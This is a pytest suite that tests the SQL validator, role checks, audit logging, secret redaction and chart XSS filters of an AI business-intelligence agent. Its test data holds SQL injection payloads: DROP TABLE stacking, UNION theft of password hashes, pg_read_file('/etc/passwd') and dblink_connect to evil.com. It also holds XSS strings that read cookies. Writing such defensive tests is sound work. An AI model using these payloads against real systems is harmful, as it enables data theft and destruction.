"""
Adversarial Security Test Suite for AI Business Intelligence Agent.
Tests SQL injection, CTE manipulation, dangerous functions, catalog probing,
cross-tenant isolation, prompt injection framing, RBAC enforcement,
secret redaction, and audit logging guarantees.
"""

from __future__ import annotations

import uuid
import pytest
from fastapi import HTTPException
from sqlalchemy.ext.asyncio import AsyncSession

from app.connectors.csv_connector import CSVConnector
from app.models.data_source import DataSource, DataSourceStatus, DataSourceType
from app.models.dataset import Dataset, DatasetStatus
from app.models.organization import OrgMembership, OrgRole, Organization
from app.models.query import ExecutionStatus, ValidationStatus
from app.models.user import User
from app.schemas.chart import AxisConfig, ChartSpec, ChartType
from app.schemas.query_plan import QueryPlan
from app.security.password import hash_password
from app.security.redaction import redact_dictionary, redact_string
from app.services.query_executor import QueryExecutor
from app.services.sql_validator import SQLValidator


# ==============================================================================
# 1. Deterministic AST SQL Validator Hardening Tests
# ==============================================================================

def test_reject_stacked_statement_injection():
    validator = SQLValidator(allowed_tables={"orders"}, dialect="postgres")
    res = validator.validate("SELECT * FROM orders; DROP TABLE users; --")
    assert res.is_valid is False
    assert any("Multiple SQL statements detected" in err or "Forbidden operation" in err for err in res.errors)


def test_reject_union_exfiltration_to_unauthorized_table():
    validator = SQLValidator(allowed_tables={"orders"}, dialect="postgres")
    res = validator.validate("SELECT id FROM orders UNION SELECT password_hash FROM users")
    assert res.is_valid is False
    assert any("Access to table 'users' is prohibited" in err for err in res.errors)


def test_reject_cte_data_modification_injection():
    """PostgreSQL supports data-modifying CTEs (WITH del AS (DELETE...)). Must be rejected."""
    validator = SQLValidator(allowed_tables={"orders"}, dialect="postgres")
    res = validator.validate("WITH malicious_delete AS (DELETE FROM orders RETURNING *) SELECT * FROM malicious_delete")
    assert res.is_valid is False
    assert any("Delete" in err or "non-read-only" in err for err in res.errors)


def test_reject_system_catalog_schema_access():
    validator = SQLValidator(allowed_tables={"users"}, dialect="postgres")
    res = validator.validate("SELECT * FROM pg_catalog.pg_user")
    assert res.is_valid is False
    assert any("system schema 'pg_catalog'" in err for err in res.errors)

    res_sqlite = SQLValidator(allowed_tables={"orders"}, dialect="sqlite")
    res2 = res_sqlite.validate("SELECT * FROM sqlite_master")
    assert res2.is_valid is False
    assert any("system table 'sqlite_master'" in err or "system schema" in err for err in res2.errors)


def test_reject_system_tables_without_schema_prefix():
    validator = SQLValidator(allowed_tables={"pg_shadow"}, dialect="postgres")
    res = validator.validate("SELECT * FROM pg_shadow")
    assert res.is_valid is False
    assert any("system table 'pg_shadow'" in err for err in res.errors)


def test_reject_subquery_information_exfiltration():
    validator = SQLValidator(allowed_tables={"orders"}, dialect="postgres")
    res = validator.validate("SELECT id, (SELECT password_hash FROM users LIMIT 1) FROM orders")
    assert res.is_valid is False
    assert any("Access to table 'users' is prohibited" in err for err in res.errors)


def test_reject_select_into_clause():
    validator = SQLValidator(allowed_tables={"orders"}, dialect="postgres")
    res = validator.validate("SELECT * INTO stolen_orders FROM orders")
    assert res.is_valid is False
    assert any("SELECT INTO" in err or "Forbidden" in err for err in res.errors)


@pytest.mark.parametrize(
    "func_payload",
    [
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT pg_write_file('/tmp/pwn', 'hacked')",
        "SELECT pg_sleep(10)",
        "SELECT dblink_connect('host=evil.com')",
        "SELECT lo_export(100, '/tmp/leak')",
        "SELECT query_to_xml('SELECT * FROM users', true, false, '')",
        "SELECT set_config('statement_timeout', '0', false)",
    ],
)
def test_reject_dangerous_functions(func_payload: str):
    validator = SQLValidator(allowed_tables={"orders"}, dialect="postgres")
    res = validator.validate(func_payload)
    assert res.is_valid is False
    assert any("Disallowed function" in err or "dangerous function" in err for err in res.errors)


# ==============================================================================
# 2. Typed Query Plan Schema Validation Tests
# ==============================================================================

def test_valid_query_plan_schema():
    ds_id = uuid.uuid4()
    plan = QueryPlan(
        dataset_id=ds_id,
        intent="aggregation",
        target_tables=["orders"],
        selected_metrics=["total_amount"],
        grouping_dimensions=["region"],
        sql_statement="SELECT region, SUM(amount) FROM orders GROUP BY region",
        estimated_rows=50,
        explanation="Calculates sum of amount grouped by sales region.",
    )
    assert plan.target_tables == ["orders"]
    assert plan.intent == "aggregation"


def test_reject_query_plan_with_invalid_characters_in_table():
    with pytest.raises(ValueError, match="Invalid table identifier"):
        QueryPlan(
            dataset_id=uuid.uuid4(),
            intent="aggregation",
            target_tables=["orders; DROP TABLE users;"],
            selected_metrics=["amount"],
            sql_statement="SELECT * FROM orders",
            explanation="Invalid plan test",
        )


def test_reject_query_plan_with_embedded_semicolons():
    with pytest.raises(ValueError, match="Multiple statements or internal semicolons prohibited"):
        QueryPlan(
            dataset_id=uuid.uuid4(),
            intent="aggregation",
            target_tables=["orders"],
            selected_metrics=["amount"],
            sql_statement="SELECT * FROM orders; DROP TABLE users;",
            explanation="Stacked query plan injection",
        )


# ==============================================================================
# 3. Execution Pipeline & Authorization Tests
# ==============================================================================

@pytest.mark.asyncio
async def test_denied_query_never_reaches_database_and_logs_audit(db_session: AsyncSession):
    user = User(email="audit_sec@example.com", password_hash=hash_password("Pass123!"), full_name="Audit Sec User")
    db_session.add(user)
    await db_session.flush()

    org = Organization(name="Sec Org", slug=f"sec-org-{uuid.uuid4().hex[:6]}", created_by=user.id)
    db_session.add(org)
    await db_session.flush()

    membership = OrgMembership(user_id=user.id, org_id=org.id, role=OrgRole.ANALYST)
    db_session.add(membership)

    source = DataSource(
        org_id=org.id,
        created_by=user.id,
        name="Mock Source",
        source_type=DataSourceType.CSV,
        connection_config={"file_path": "non_existent.csv", "table_name": "orders"},
        status=DataSourceStatus.CONNECTED,
    )
    db_session.add(source)
    await db_session.flush()

    dataset = Dataset(
        org_id=org.id,
        data_source_id=source.id,
        name="Orders Dataset",
        table_name="orders",
        status=DatasetStatus.READY,
    )
    db_session.add(dataset)
    await db_session.commit()

    # Attempt malicious DDL injection
    malicious_sql = "DROP TABLE users; --"
    exec_record, result = await QueryExecutor.execute_query(
        db=db_session,
        org_id=org.id,
        user_id=user.id,
        dataset_id=dataset.id,
        sql_query=malicious_sql,
    )

    # 1. Result must be None (never executed)
    assert result is None
    # 2. Record must be REJECTED / FAILED
    assert exec_record.validation_status == ValidationStatus.REJECTED
    assert exec_record.execution_status == ExecutionStatus.FAILED
    assert any(term in exec_record.error_message for term in ["Multiple", "Forbidden", "Statement type", "prohibited"])

    # 3. Verify Audit Event was created in DB
    from app.models.audit import AuditEvent
    audit_events = (await db_session.execute(
        AuditEvent.__table__.select().where(AuditEvent.org_id == org.id, AuditEvent.action == "query.rejected")
    )).fetchall()
    assert len(audit_events) >= 1
    assert audit_events[0].resource_id == exec_record.id


@pytest.mark.asyncio
async def test_viewer_role_rejected_from_query_execution(db_session: AsyncSession):
    user = User(email="viewer_sec@example.com", password_hash=hash_password("Pass123!"), full_name="Viewer User")
    db_session.add(user)
    await db_session.flush()

    org = Organization(name="Viewer Org", slug=f"view-org-{uuid.uuid4().hex[:6]}", created_by=user.id)
    db_session.add(org)
    await db_session.flush()

    # User is only a VIEWER
    membership = OrgMembership(user_id=user.id, org_id=org.id, role=OrgRole.VIEWER)
    db_session.add(membership)

    source = DataSource(
        org_id=org.id,
        created_by=user.id,
        name="Viewer Source",
        source_type=DataSourceType.CSV,
        connection_config={"file_path": "test.csv", "table_name": "orders"},
        status=DataSourceStatus.CONNECTED,
    )
    db_session.add(source)
    await db_session.flush()

    dataset = Dataset(
        org_id=org.id,
        data_source_id=source.id,
        name="Viewer Dataset",
        table_name="orders",
        status=DatasetStatus.READY,
    )
    db_session.add(dataset)
    await db_session.commit()

    with pytest.raises(HTTPException) as exc_info:
        await QueryExecutor.execute_query(
            db=db_session,
            org_id=org.id,
            user_id=user.id,
            dataset_id=dataset.id,
            sql_query="SELECT * FROM orders",
        )
    assert exc_info.value.status_code == 403
    assert "Viewer role is not permitted" in exc_info.value.detail


# ==============================================================================
# 4. Redaction & Chart XSS Security Tests
# ==============================================================================

def test_secret_redaction_utility():
    sample_conn = "postgresql://my_user:SuperSecretPassword123!@db.internal:5432/analytics"
    redacted_conn = redact_string(sample_conn)
    assert "SuperSecretPassword123!" not in redacted_conn
    assert "postgresql://my_user:***@db.internal:5432/analytics" == redacted_conn

    # JWT Redaction
    sample_jwt = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abc123xyz456"
    assert "[REDACTED_JWT]" in redact_string(sample_jwt)

    # Dictionary recursion
    secret_dict = {
        "password": "plain_password",
        "nested": {"token": "my_api_token", "normal_field": "safe_value"},
    }
    redacted_d = redact_dictionary(secret_dict)
    assert redacted_d["password"] == "[REDACTED]"
    assert redacted_d["nested"]["token"] == "[REDACTED]"
    assert redacted_d["nested"]["normal_field"] == "safe_value"


def test_chart_spec_xss_prevention():
    # Attempt script injection in title
    with pytest.raises(ValueError, match="Malicious markup or script detected"):
        ChartSpec(
            chart_type=ChartType.BAR,
            title="Sales <script>alert('pwned')</script>",
            data=[{"sales": 100}],
        )

    # Attempt javascript URI in title
    with pytest.raises(ValueError, match="Malicious markup or script detected"):
        ChartSpec(
            chart_type=ChartType.LINE,
            title="javascript:alert(document.cookie)",
            data=[{"val": 10}],
        )

    # Attempt HTML payload in axis label
    with pytest.raises(ValueError, match="Malicious markup or script detected"):
        AxisConfig(
            field="region",
            label="<img src=x onerror=alert(1)>",
        )
